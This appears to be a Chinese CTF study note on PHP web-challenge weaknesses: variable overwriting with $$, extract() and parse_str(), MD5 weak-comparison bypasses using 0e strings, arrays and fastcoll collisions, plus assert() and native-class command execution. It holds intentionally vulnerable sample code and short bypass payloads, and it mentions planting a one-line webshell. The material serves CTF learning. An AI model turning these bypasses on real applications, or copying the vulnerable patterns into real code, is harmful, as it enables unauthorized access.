-GET DATA：<code>?_200=flag </code>POST DATA：<code>flag=aaaaaaaaaaaaaaaaaaaaa</code><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621816.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621816.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621816.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621816.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621816.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621816.png 2x" sizes=auto alt=image.png></a></figure></p><h4 id=例题2bjdctf2020mark-loves-cat class=headerLink><a href=#%e4%be%8b%e9%a2%982bjdctf2020mark-loves-cat class=header-mark></a>例题2([BJDCTF2020]Mark loves cat)</h4><pre tabindex=0><code>&lt;?php
-
-include &#39;flag.php&#39;;
-
-$yds = &#34;dog&#34;;
-$is = &#34;cat&#34;;
-$handsome = &#39;yds&#39;;
-
-foreach($_POST as $x =&gt; $y){
-    $$x = $y;  
-}
-
-foreach($_GET as $x =&gt; $y){
-    $$x = $$y;  
-}
-
-foreach($_GET as $x =&gt; $y){
-    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){ 
-        exit($handsome);
-    }
-}
-
-if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){  
-    exit($yds);
-}
-
-if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){   
-    exit($is);
-}
-
-echo &#34;the flag is: &#34;.$flag;
-</code></pre><p><strong>题目分析：</strong>
-代码审计得知绕过三个<code>if</code>函数直接<code>echo</code>明显不现实 所以突破点就是那三个<code>exit</code>
-:::tips
-exit() 输出一条消息，并退出当前脚本
-:::
-上面我们要想绕过需要：</p><ul><li><strong>get参数</strong>必须含有<code>$x</code>同时<code>$x</code>不能含有<strong>flag</strong></li><li>存在<strong>get参数</strong>或者存在<strong>post参数</strong></li><li><strong>post参数</strong>恒等于<strong>flag</strong>或者<strong>get参数</strong>恒等于<strong>flag</strong>
-当我们到达最后的时候flag也被重置了</li></ul><p>在这一关可以执行输出内容地方有两个函数<code>exit</code>和<code>echo</code></p><h5 id=法1覆盖-yds class=headerLink><a href=#%e6%b3%951%e8%a6%86%e7%9b%96-yds class=header-mark></a>法1——覆盖 <code>yds</code></h5><p>让<code>$flag</code>覆盖到<code>yds</code>上，在执行<code>exit($yds);</code>的时候输出<strong>flag</strong>
-<strong>payload:</strong>
-<code>?yds=flag</code>
-我们进行get传参的时候，会执行:
-:::tips
-foreach($_GET as $x => $y){　　　
-$$x = $$y; //GET型变量重新赋值为当前文件变量中以其值>为键名的值
-}
-:::
-:::tips
-if(!isset($_GET[&lsquo;flag&rsquo;]) && !isset($_POST[&lsquo;flag&rsquo;])){<br>    exit($yds);
-}
-:::
-语句输出<code>$yds</code>，我们只需让<code>$yds=$flag</code>就好了，由于我们输入的变量是<code>yds=flag</code>
-所以<code>$x=yds</code> <code>$y=flag</code>，再由<code>$$x = $$y</code> 可知 <code>$yds=$flag</code>，<code>$flag</code>是我们要的
-综上：<code>exit($yds)</code>就是<code>echo $flag</code></p><h5 id=法2覆盖is class=headerLink><a href=#%e6%b3%952%e8%a6%86%e7%9b%96is class=header-mark></a>法2——覆盖<code>is</code></h5><p>前半段和前面的方法原理相同，让flag覆盖is
-后面的<code>flag=flag</code>—><code>$flag=$flag</code>目的是为了符合第三个<code>if</code>需求：
-:::tips
-if($_POST[&lsquo;flag&rsquo;] === &lsquo;flag&rsquo; || $_GET[&lsquo;flag&rsquo;] === &lsquo;flag&rsquo;){<br>exit($is);
-}
-:::
-进而输出<code>flag</code>
-<strong>payload:</strong>
-<code>?is=flag&amp;flag=flag</code></p><h5 id=法3覆盖handsome class=headerLink><a href=#%e6%b3%953%e8%a6%86%e7%9b%96handsome class=header-mark></a>法3——覆盖<code>handsome</code></h5><p>:::tips
-foreach($_GET as $x => $y){
-    if($_GET[&lsquo;flag&rsquo;] === $x && $x !== &lsquo;flag&rsquo;){
-        exit($handsome);
-    }
-}
-:::
-<code>handsome=flag</code>就是让<code>$handsome=$flag</code>
-目的就是让我们传入的变量是<code>flag</code>值不是<strong>flag</strong>进而能够执行<code>exit($handsome);</code>
-这里的值表面是 <code>x</code>但前面我们进行了变量覆盖使得<code>x=flag</code>所以在这里我们输出<code>x</code>的值就是<code>flag</code>值
-<strong>payload:</strong>
-<code>?handsome=flag&amp;flag=x&amp;x=flag</code></p><h3 id=extract class=headerLink><a href=#extract class=header-mark></a><code>extract()</code></h3><p><code>extract()</code> 该函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><pre tabindex=0><code>&lt;?php
-$data = array(
-    &#34;name&#34; =&gt; &#34;John&#34;,
-    &#34;age&#34; =&gt; 30,
-    &#34;city&#34; =&gt; &#34;New York&#34;
-);
-
-extract($data);
-
-echo &#34;Name: $name, Age: $age, City: $city&#34;;
-?&gt;
-
-//输出：
-//Name: John, Age: 30, City: New York
-</code></pre><h4 id=例题1-1 class=headerLink><a href=#%e4%be%8b%e9%a2%981-1 class=header-mark></a>例题1</h4><pre tabindex=0><code>&lt;?php
-
-   $flag = &#39;xxx&#39;;
-
-   extract($_GET);
-
-   if(isset($gift)) 
-   {
-       $content = trim(file_get_contents($flag));
-
-       if($gift == $content) 
-      {
-            echo &#39;flaaaaaag&#39;;
-
-      } 
-       else 
-		{
-           echo &#39;nonono&#39;;
-		}
-
-   } 
-?&gt;
-
-//trim() 函数移除字符串两侧的空白字符或其他预定义字符
-</code></pre><p><strong>题目分析： **
-题目使用了<code>extract($_GET)</code>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用<code>extract()</code>对变量进行覆盖，从而满足各个条件。
-<strong>解题方法： **
-GET请求<code>?flag=&amp;gift=</code>，<code>extract()</code>会将flag和gift的值覆盖了，将变量的值设置为</strong>空</strong>或者<strong>不存在的文件</strong>就满足<code>gift==content</code>
-<strong>最终payload</strong>：
-GET DATA：<code>?flag=&amp;gift=</code><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621813.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621813.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621813.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621813.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621813.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621813.png 2x" sizes=auto alt=image.png></a></figure></p><h4 id=例题2 class=headerLink><a href=#%e4%be%8b%e9%a2%982 class=header-mark></a>例题2</h4><pre tabindex=0><code>&lt;?php 
-    if ($_SERVER[&#34;REQUEST_METHOD&#34;] == “POST”) 
-   {
-        extract($_POST);
-    
-        if ($pass == $thepassword_123) 
-       { 
-
-            &lt;div class=”alert alert-success”&gt;
-
-            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
-
-            &lt;/div&gt;
-
-        } 
-    }
-?&gt;
-</code></pre><p>**题目分析： **
-题目要求使用POST提交数据，<code>extract($_POST)</code>会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖<code>$pass</code>和<code>$thepassword_123</code>变量的值，从而满足<code>pass==thepassword_123</code>这个条件。
-**解题方法： **
-使用POST请求提交<code>pass=&amp;thepassword_123=</code> ，然后<code>extract()</code>会将接收到的数据将<code>$pass</code>和<code>$thepassword_123</code>变量的值覆盖为空，便满足条件了。
-**最终payload： **
-POST DATA：<code>pass=&amp;thepassword_123=</code></p><h3 id=parse_str class=headerLink><a href=#parse_str class=header-mark></a><code>parse_str()</code></h3><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621922.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621922.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621922.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621922.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621922.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621922.png 2x" sizes=auto alt=image.png></a></figure><code>parse_str()</code>函数用于将字符串解析成多个变量，如果没有array参数，则由该函数设置的变量将覆盖已存在的同名变量<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621912.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621912.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621912.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621912.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621912.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621912.png 2x" sizes=auto alt=image.png></a></figure></p><h4 id=例题1-2 class=headerLink><a href=#%e4%be%8b%e9%a2%981-2 class=header-mark></a>例题1</h4><pre tabindex=0><code>&lt;?php
-
-       error_reporting(0);
-
-       if (empty($_GET[&#39;id&#39;])) 
-      {
-            show_source(__FILE__);
-            die();
-      } 
-      else 
-     {
-            $a = &#34;www.OPENCTF.com&#34;;
-            $id = $_GET[&#39;id&#39;];
-            @parse_str($id);
-            if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) 
-           {
-                 echo flaaaaaag;
-           } 
-           else 
-           {
-                 exit(&#39;其实很简单其实并不难！&#39;);
-           }
-
-       }
-
-?&gt; 
-</code></pre><p>**题目分析： **
-首先要求使用GET提交id参数，然后<code>parse_str($id)</code>对<code>id</code>参数的数据进行处理，再使用判断<code>a[0] != ‘QNKCDZO’ && md5(a[0] != ‘QNKCDZO’ && md5(a[0]) == md5(‘QNKCDZO’)</code>的结果是否为真，为真就返回<code>flaaaaaag</code>，<code>md5(‘QNKCDZO’)</code>的结果是<code>0e830400451993494058024219903391</code>由于此次要满足<code>a[0] != ‘QNKCDZO’ && md5(a[0] != ‘QNKCDZO’ && md5(a[0]) == md5(‘QNKCDZO’)</code>所以要利用php弱语言特性(详细见前面<a href=#vMVSb rel>md5漏洞利用</a>)，所以需要找到一个字符串md5后的结果是0e开头后面都是数字的
-**解题方法： **
-使用GET请求，将<code>a[0]</code>随便传一个MD5(值)计算后结果开头是0e，<code>id=a[0]=**s878926199a **</code>
-**最终payload： **
-GET DATA:
-<code>?id=a[0]=s878926199a</code><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621907.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621907.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621907.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621907.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621907.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621907.png 2x" sizes=auto alt=image.png></a></figure></p><h2 id=非法变量名转换 class=headerLink><a href=#%e9%9d%9e%e6%b3%95%e5%8f%98%e9%87%8f%e5%90%8d%e8%bd%ac%e6%8d%a2 class=header-mark></a>非法变量名转换</h2><blockquote><p>变量名与 PHP 中其它的标签一样遵循相同的规则。一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字，或者下划线。 按照正常的正则表达式，它将被表述为：<code>^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$</code></p></blockquote><p>非法的字符 (点, 空格, 括号等) 会被转换成下划线
-例如过滤了 <code>_</code> 如何构造 <code>__CTFSHOW__</code> ?
-答案是传参的时候参数名写成 <code>..CTFSHOW..</code>
-另外有一个绕过转换的 trick, <strong>PHP &lt; 8 有效</strong>
-<a href=https://blog.csdn.net/mochu7777777/article/details/115050295 target=_blank rel="noopener noreferrer">https://blog.csdn.net/mochu7777777/article/details/115050295</a>
-<code>[</code> 被转换为<code>_</code>, 而后面的 <code>.</code> 不转换（<strong>只替换一次</strong>）
-例如, 构造 <code>CTF_SHOW.COM</code> 的变量名可以传参 <code>CTF[SHOW.COM</code>
-在变量覆盖的时候会很有用</p><h2 id=不加引号的字符串 class=headerLink><a href=#%e4%b8%8d%e5%8a%a0%e5%bc%95%e5%8f%b7%e7%9a%84%e5%ad%97%e7%ac%a6%e4%b8%b2 class=header-mark></a>不加引号的字符串</h2><p>PHP 会自动帮我们推断对应值的类型
-例如下面的代码执行后会爆 Warning, 但能正常输出 <code>flag_give_me</code></p><pre tabindex=0><code>$fl0g = flag_give_me;
-
-echo $fl0g;
-</code></pre><h2 id=反引号内引用变量 class=headerLink><a href=#%e5%8f%8d%e5%bc%95%e5%8f%b7%e5%86%85%e5%bc%95%e7%94%a8%e5%8f%98%e9%87%8f class=header-mark></a>反引号内引用变量</h2><p>``$F<code>; sleep 3</code>
-反引号内能够引用变量, 与 <code>"$var"</code> 类似
-<a href=https://blog.csdn.net/qq_46091464/article/details/109095382 target=_blank rel="noopener noreferrer">ctfshow web133和其他命令执行的骚操作</a></p><h2 id=globalsget_defined_vars class=headerLink><a href=#globalsget_defined_vars class=header-mark></a>$GLOBALS/get_defined_vars()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621906.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621906.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621906.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621906.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621906.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621906.png 2x" sizes=auto alt=image.png></a></figure>在 PHP 中, 被定义在函数外部的变量, 拥有全局作用域, 被称作全局变量
-如果要想在函数内部使用全局变量, 必须通过 <code>global $var</code> 来显式引用或者是通过超全局变量数组 <code>$GLOBALS['var']</code>来访问
-<code>$GLOBALS</code> 数组存储着文件中所有的全局变量 (包含 include 进来的全局变量)<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621347.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621347.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621347.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621347.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621347.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621347.png 2x" sizes=auto alt=image.png></a></figure><code>get_defined_vars()</code> 返回由所有已定义变量所组成的数组
-有时候可以从这里面查看 <code>$flag</code></p><h2 id=_serverargv-与-_serverquery_string class=headerLink><a href=#_serverargv-%e4%b8%8e-_serverquery_string class=header-mark></a>$_SERVER[&lsquo;argv&rsquo;] 与 $_SERVER[&lsquo;QUERY_STRING&rsquo;]</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621410.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621410.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621410.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621410.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621410.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621410.png 2x" sizes=auto alt=image.png></a></figure><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621377.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621377.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621377.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621377.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621377.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621377.png 2x" sizes=auto alt=image.png></a></figure><code>$_SERVER['argv']</code>与 <code>$_SERVER['QUERY_STRING']</code> 不同的是前者是数组, 而后者是一整个字符串
-<code>$_SERVER['argv']</code> 数组里面的每一项在 GET 传参中以空格分隔 (url 编码以后就是加号)
-<strong>注意这两个变量的值都会进行 url 编码</strong></p><h2 id=assert class=headerLink><a href=#assert class=header-mark></a>assert()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621398.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621398.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621398.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621398.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621398.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621398.png 2x" sizes=auto alt=image.png></a></figure><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621400.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621400.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621400.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621400.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621400.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621400.png 2x" sizes=auto alt=image.png></a></figure>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行 可见，<code>eval</code>和<code>assert</code>都可以将字符当作代码执行，只不过assert不需要严格遵从语法语句末尾的<strong>分号可不加</strong></p><h2 id=不含字母数字的函数gettext拓展 class=headerLink><a href=#%e4%b8%8d%e5%90%ab%e5%ad%97%e6%af%8d%e6%95%b0%e5%ad%97%e7%9a%84%e5%87%bd%e6%95%b0gettext%e6%8b%93%e5%b1%95 class=header-mark></a>不含字母数字的函数(gettext()拓展)</h2><p><a href=https://www.cnblogs.com/lost-1987/articles/3309693.html target=_blank rel="noopener noreferrer">关于php中gettext的用法</a>
-<code>gettext()</code> 用于实现输出的国际化, 在不同区域输出不同语言的内容
-<strong>本地测试时需要开启 <strong><code>**php_gettext**</code></strong> 扩展</strong>
-<code>_()</code> 为 <code>gettext()</code> 别名, 类似于 echo 输出<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png 2x" sizes=auto alt=image.png></a></figure></p><pre tabindex=0><code>echo gettext(&#34;phpinfo&#34;); 
-结果  phpinfo
-echo _(&#34;phpinfo&#34;); 
-结果 phpinfo 
-</code></pre><p><code>var_dump(call_user_func(call_user_func("_", "get_defined_vars")));</code>此命令可以返回所有已定义变量
-一层 <code>call_user_func("_", "xx")</code> 返回 <code>xx</code> 字符串, 然后被当作回调函数名被第二个 <code>call_user_func()</code> 调用
-也就是说我们最终利用的函数不能含有参数, 而且必须是一步到位的</p><h2 id=原生类列目录rce class=headerLink><a href=#%e5%8e%9f%e7%94%9f%e7%b1%bb%e5%88%97%e7%9b%ae%e5%bd%95rce class=header-mark></a>原生类列目录/RCE</h2><p>一般都是 <code>echo new $v1($v2('xxx'))</code> 或者 <code>eval($v('ctfshow'))</code> 的形式, 有时候可以跳出来执行其它代码
-<code>ReflectionClass</code> 和 <code>Exception</code> 里面可以执行其它函数
-<code>FilesystemIterator</code> 列目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;xx&#39;</span><span class=p>))</span>
+</span></span></span></code></pre></div><h2 id=ereg class=headerLink><a href=#ereg class=header-mark></a>ereg()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105092.png></a></figure></p><h3 id=00-截断 class=headerLink><a href=#00-%e6%88%aa%e6%96%ad class=header-mark></a>%00 截断</h3><p><code>ereg()</code>函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用<code>%00</code>截断正则匹配</p><h3 id=数组截断 class=headerLink><a href=#%e6%95%b0%e7%bb%84%e6%88%aa%e6%96%ad class=header-mark></a>数组截断</h3><p><code>ereg()</code>只能处理字符串的，遇到数组做参数返回NULL</p><h2 id=trim class=headerLink><a href=#trim class=header-mark></a>trim()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105093.png></a></figure></p><p>不过滤 <code>\f</code> 换页符, url 编码后是<code>%0c36</code></p><h2 id=strrev class=headerLink><a href=#strrev class=header-mark></a>strrev()</h2><p>反转字符串，常出现在<code>%00</code>截断漏洞中<br><strong>注：</strong><code>**%00**</code><strong>是一个整体，不会反转成</strong><code>**00%**</code></p><h2 id=md5sha1-绕过 class=headerLink><a href=#md5sha1-%e7%bb%95%e8%bf%87 class=header-mark></a>MD5/sha1 绕过(==、===)</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>if ($name != $password &amp;&amp; md5($name) == md5($password)){
+</span></span><span class=line><span class=cl>        echo $flag;
+</span></span><span class=line><span class=cl>    }
+</span></span></code></pre></div><p>既要两变量个值不相同，又要两个变量md5值一样，<br>可以发现此时判断md5值是否一样用的是弱类型比较==</p><h3 id=0e绕过 class=headerLink><a href=#0e%e7%bb%95%e8%bf%87 class=header-mark></a>0E绕过</h3><p>可以使用带<strong>0e</strong>开头的数字穿进行传递参数，可以使用以0E开头的hash值绕过，因为处理hash字符串时，PHP会将每一个以<strong>0E</strong>开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以<strong>0E</strong>开头的，那么PHP会认为它们相同</p><ol><li><p>MD5(值)计算后结果开头是0e。0e开头是让PHP把这段字符串认为是科学计数法字符串的先决条件。</p></li><li><p>0e后面全是数字。例如, 0e123==0e234,0的N次方始终是0,所以弱类型比较可以相等。</p></li></ol><p>满足这两个条件(MD5后结果开头为0e， 且后面全部是数字) 的字符串如下：</p><p>:::tips
+bDLytmyGm2xQyaLNhWn</p><p>770hQgrBOjrcqftrlaZk</p><p>7r41GXCH2Ksu2JNT3BYM</p><p>:::</p><p><strong>0e开头并且md5后仍然0e开头的字符串:</strong></p><p><code>0e215962017</code></p><h3 id=数组绕过-1 class=headerLink><a href=#%e6%95%b0%e7%bb%84%e7%bb%95%e8%bf%87-1 class=header-mark></a>数组绕过</h3><p>(PHP5和PHP7可以，PHP8不行)，如<code>name[]=123&amp;password[]=456</code>，md5/sha1不能加密数组，故两个md5返回的都是<code>null</code></p><h3 id=md5碰撞 class=headerLink><a href=#md5%e7%a2%b0%e6%92%9e class=header-mark></a>md5碰撞</h3><p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件</p><p>若遇到<code>===</code>这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同</p><h5 id=fastcoll-使用 class=headerLink><a href=#fastcoll-%e4%bd%bf%e7%94%a8 class=header-mark></a>fastcoll 使用：</h5><p><strong>在</strong><code>**1.txt**</code><strong>中写入一句话木马</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105094.png></a></figure></p><p>然后把文件丢到 fastcoll 里跑一下</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105095.png></a></figure></p><p>得到两个文件，这两文件读到字符串是不一样的，但md5后是一样的。</p><p>利用脚本读取</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>$a = file_get_contents(&#39;C:\Users\DELL\Desktop\tool\1_msg1.txt&#39;);
+</span></span><span class=line><span class=cl>$b = file_get_contents(&#39;C:\Users\DELL\Desktop\tool\1_msg2.txt&#39;);
+</span></span><span class=line><span class=cl>print_r($a . &#34;&lt;br&gt;&#34;);
+</span></span><span class=line><span class=cl>print_r($b . &#34;&lt;br&gt;&#34;);
+</span></span><span class=line><span class=cl>print_r(var_dump($a === $b) . &#34;&lt;br&gt;&#34;);   // bool(false)
+</span></span><span class=line><span class=cl>print_r(var_dump(md5($a) === md5($b)) . &#34;&lt;br&gt;&#34;);   // bool(true)
